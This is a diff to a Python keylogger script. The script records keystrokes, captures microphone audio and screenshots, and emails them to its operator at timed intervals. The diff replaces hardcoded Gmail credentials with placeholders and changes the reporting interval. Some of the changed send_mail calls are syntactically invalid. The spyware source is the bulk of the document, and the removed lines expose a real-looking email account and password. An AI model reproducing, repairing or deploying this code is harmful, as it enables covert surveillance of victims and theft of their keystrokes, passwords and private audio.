@@ -17,9 +17,9 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "kejlogr@gmail.com"
-    EMAIL_PASSWORD = "janevim123"
-    SEND_REPORT_EVERY = 120 # as in seconds
+    EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
+    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+    SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
@@ -82,7 +82,7 @@ finally:
 
         def microphone(self):
             fs = 44100
-            seconds = 120
+            seconds = SEND_REPORT_EVERY
             obj = wave.open('sound.wav', 'w')
             obj.setnchannels(1)  # mono
             obj.setsampwidth(2)
@@ -91,11 +91,11 @@ finally:
             obj.writeframesraw(myrecording)
             sd.wait()
 
-            self.send_mail(email=kejlogr@gmail.com, password=janevim123, message=obj)
+            self.send_mail(email=EMAIL_ADDRESS, EMAIL_PASSWORD, message=obj)
 
         def screenshot(self):
             img = pyscreenshot.grab()
-            self.send_mail(email=kejlogr@gmail.com, password=janevim123, message=img)
+            self.send_mail(email=EMAIL_ADDRESS, EMAIL_PASSWORD, message=img)
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -125,7 +125,7 @@ finally:
                 except OSError:
                     print('File is close.')
 
-    keylogger = KeyLogger(120, kejlogr@gmail.com, janevim123)
+    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
 
 
